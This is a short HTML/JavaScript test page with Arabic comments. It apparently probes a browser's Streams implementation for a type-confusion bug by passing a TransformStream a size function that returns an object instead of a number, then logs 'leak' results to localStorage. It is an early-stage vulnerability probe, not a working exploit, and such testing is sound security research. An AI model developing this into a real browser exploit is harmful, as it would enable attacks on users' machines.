<!DOCTYPE html>
<html>
<body>
<div id="s">Running...</div>
<script>
localStorage.removeItem('leak_result');
localStorage.removeItem('leak_data');

let buf = new ArrayBuffer(8);
let view = new DataView(buf);

// دالة size: ستعيد كائناً بدلاً من رقم
// إذا لم يفحص المحرك النوع، سيحدث Type Confusion
let sizeFunc = function(chunk) {
    // اكتب في buf لتأكيد أن الدالة استُدعيت
    view.setFloat64(0, 1.1, true);
    
    // أعد كائناً بدلاً من رقم
    // المحرك يتوقع رقماً، فإذا استخدم الكائن كرقم...
    return { valueOf: () => { return 1; } };
};

try {
    // أنشئ TransformStream مع size function
    let stream = new TransformStream(
        { transform: (c, ctrl) => ctrl.enqueue(c) },
        { highWaterMark: 1, size: sizeFunc },
        { highWaterMark: 1, size: sizeFunc }
    );
    
    // اكتب chunk لتشغيل size()
    let writer = stream.writable.getWriter();
    writer.write("test").then(() => {
        let hex = "";
        for (let i = 0; i < 8; i++) {
            hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
        }
        localStorage.setItem('leak_result', 'WRITE_OK');
        localStorage.setItem('leak_data', hex);
    }).catch((e) => {
        localStorage.setItem('leak_result', 'WRITE_ERR: ' + e.message);
    });
    
    // سجل فورياً بعد الإنشاء
    localStorage.setItem('leak_result', 'STREAM_CREATED');
    
} catch(e) {
    localStorage.setItem('leak_result', 'CREATE_ERR: ' + e.message);
}

document.getElementById("s").textContent = "Done.";
</script>
</body>
</html>
